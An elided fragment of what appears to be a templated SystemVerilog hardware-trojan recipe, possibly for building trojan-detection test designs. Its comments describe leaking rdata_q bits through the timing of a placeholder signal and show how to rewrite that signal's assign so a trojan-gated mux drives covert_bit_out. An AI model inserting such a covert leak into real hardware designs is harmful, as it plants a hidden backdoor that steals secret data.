 ...
 * Payload: Modulate {{PAYLOAD_SIGNAL}} timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of {{PAYLOAD_SIGNAL}}:
...
logic       covert_bit_out;         // Drives {{PAYLOAD_SIGNAL}} when trojan active
...
//   Find the assign for {{PAYLOAD_SIGNAL}} (or rd_error_o as fallback):
//     assign {{PAYLOAD_SIGNAL}} = <normal_expr>;
//   Replace with:
//     assign {{PAYLOAD_SIGNAL}} = trojan_active ? covert_bit_out : (<normal_expr>);
//
